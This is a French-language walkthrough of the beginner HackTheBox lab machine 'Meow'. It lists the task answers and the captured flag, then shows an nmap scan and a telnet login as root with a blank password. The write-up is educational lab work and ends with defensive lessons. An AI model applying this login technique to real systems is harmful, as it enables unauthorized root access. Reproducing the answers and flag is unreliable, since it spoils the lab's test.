```
 /\_____/\
(  ^   ^  )   ██╗  ██╗ █████╗  ██████╗██╗  ██╗████████╗██╗  ██╗███████╗██████╗  ██████╗ ██╗  ██╗
( (  ω  ) )   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝
 \ ~~~~~ /    ███████║███████║██║     █████╔╝    ██║   ███████║█████╗  ██████╔╝██║   ██║ ╚███╔╝
  )     (     ██╔══██║██╔══██║██║     ██╔═██╗    ██║   ██╔══██║██╔══╝  ██╔══██╗██║   ██║ ██╔██╗
 (  ~~~  )    ██║  ██║██║  ██║╚██████╗██║  ██╗   ██║   ██║  ██║███████╗██████╔╝╚██████╔╝██╔╝ ██╗
  `~~~~~´     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝

╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ███╗   ███╗███████╗ ██████╗ ██╗    ██╗                                 ║
║   ████╗ ████║██╔════╝██╔═══██╗██║    ██║                                 ║
║   ██╔████╔██║█████╗  ██║   ██║██║ █╗ ██║                                 ║
║   ██║╚██╔╝██║██╔══╝  ██║   ██║██║███╗██║                                 ║
║   ██║ ╚═╝ ██║███████╗╚██████╔╝╚███╔███╔╝                                 ║
║   ╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝                                  ║
║                                                                          ║
║              [ HackTheBox — Starting Point ]                             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

> **Difficulté :** Very Easy  
> **Catégorie :** Starting Point  
> **OS :** Linux  
> **Date de réalisation :** 2026-06-24  

---

## 📋 Description

**MEOW** est la première machine de la série **Starting Point** de HackTheBox. Elle est conçue pour les débutants afin de se familiariser avec l'environnement HTB, la connexion VPN, et les outils de base en cybersécurité. La machine exploite une mauvaise configuration d'un service **Telnet** permettant une connexion sans mot de passe.

---

## 🎯 Objectifs

- Se connecter au réseau HTB via VPN
- Scanner les ports ouverts avec `nmap`
- Exploiter un service Telnet mal configuré
- Récupérer le flag root

---

## 🛠️ Outils utilisés

| Outil     | Description                              |
|-----------|------------------------------------------|
| `openvpn` | Connexion au réseau VPN de HackTheBox    |
| `ping`    | Test de connectivité réseau (ICMP)       |
| `nmap`    | Scanner de ports réseau                  |
| `telnet`  | Client pour le protocole Telnet          |

---

## 📝 Questions & Réponses (Tasks)

### Task 1
**Q : In cybersecurity, isolated environments — like Pwnbox or the vulnerable target machines — are often VMs. What does VM stand for?**

> ✅ `Virtual Machine`

---

### Task 2
**Q : What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.**

> ✅ `terminal`

---

### Task 3
**Q : What service do we use to form our VPN connection into HTB labs?**

> ✅ `openvpn`

---

### Task 4
**Q : What tool do we use to test our connection to the target with an ICMP echo request?**

> ✅ `ping`

---

### Task 5
**Q : What is the name of the most common tool for finding open ports on a target?**

> ✅ `nmap`

---

### Task 6
**Q : What service do we identify on port 23/tcp during our scans?**

> ✅ `telnet`

---

### Task 7
**Q : What username is able to log into the target over telnet with a blank password?**

> ✅ `root`

---

## 🚀 Exploitation

### Étape 1 — Connexion au VPN HTB

Avant tout, il faut se connecter au réseau de HackTheBox via OpenVPN avec le fichier `.ovpn` téléchargé depuis la plateforme :

```bash
sudo openvpn --config votre_fichier.ovpn
```

Une fois connecté, le message **"Connected on the target network"** s'affiche sur la plateforme.

---

### Étape 2 — Test de connectivité (Ping)

On vérifie que la machine cible est joignable avec un simple ping :

```bash
ping -c 4 10.129.X.X
```

Si des paquets ICMP sont reçus en retour, la cible est accessible.

---

### Étape 3 — Scan des ports (Nmap)

On effectue un scan pour identifier les services actifs sur la machine :

```bash
nmap -sV -sC 10.129.X.X
```

**Résultat :**

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

Le port **23** est ouvert et fait tourner le service **Telnet**.

---

### Étape 4 — Connexion Telnet

On se connecte au service Telnet en utilisant le nom d'utilisateur `root` **sans mot de passe** :

```bash
telnet 10.129.X.X
```

À l'invite de connexion :

```
Meow login: root
Password: [Entrée vide]
```

On obtient un shell root directement !

---

### Étape 5 — Récupération du Flag

Une fois connecté en tant que `root`, on navigue vers le répertoire home pour trouver le flag :

```bash
ls
cat flag.txt
```

**Flag :** `b40abdfe23665f766f9c61ecba8a4c19`

---

## 🏁 Conclusion

La machine **MEOW** illustre une vulnérabilité critique : un service **Telnet** accessible publiquement avec un compte `root` sans mot de passe. Ce type de mauvaise configuration est malheureusement encore présent dans des systèmes réels.

**Leçons apprises :**
- Toujours désactiver Telnet au profit de **SSH**
- Ne jamais laisser de compte avec un mot de passe vide, surtout `root`
- L'importance du scan de ports pour la reconnaissance

---

## 📸 Captures d'écran

### Screenshot 1 — Con/home/H4CK0ZCEF/Desktop/Cyber-Security/HackTheBox/MEOW/IMG/ping scan.png)

<!-- Remplacer par votre capture d'écran -->
![Connexion VPN HTB](./Cyber-Security/HackTheBox/MEOW/IMG/ping scan.png)

---

### Screenshot/home/H4CK0ZCEF/Desktop/Cyber-Security/HackTheBox/MEOW/IMG/nmap&telnet .png)

<!-- Remplacer par votre capture d'écran -->
![Scan Nmap](./Cyber-Security/HackTheBox/MEOW/IMG/nmap&telnet .png)

---

### Screenshot/home/H4CK0ZCEF/Desktop/Cyber-Security/HackTheBox/MEOW/IMG/flag.png)

<!-- Remplacer par votre capture d'écran -->
![Flag root](./Cyber-Security/HackTheBox/MEOW/IMG/flag.png)

---

> 📌 **Auteur :** Votre nom / pseudo  
> 🔗 **Profil HTB :** [Votre profil](https://labs.hackthebox.com/achievement/machine/3369747/394)  
> 📅 **Date :** Juin 2026
